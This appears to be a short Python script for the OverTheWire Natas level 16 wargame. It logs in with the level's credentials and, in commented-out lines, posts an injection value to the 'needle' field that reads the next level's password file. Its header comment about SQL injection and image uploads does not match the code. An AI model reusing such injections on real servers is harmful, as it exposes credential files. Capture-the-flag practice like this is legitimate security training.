
#
#The code above is a simple script that accepts an image file and stores it in a MySQL database. The code is vulnerable to SQL injection.
#

import requests
import re

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

response = session.get(url, auth = (username, password))

print(response.text)

# response = session.post(url, data = { "needle" : ".* /etc/natas_webpass/natas17 #" }, auth = (username, password))

# print(response.text)

# print(re.findall('<pre>\n(.*)\n</pre>', response.text)[0])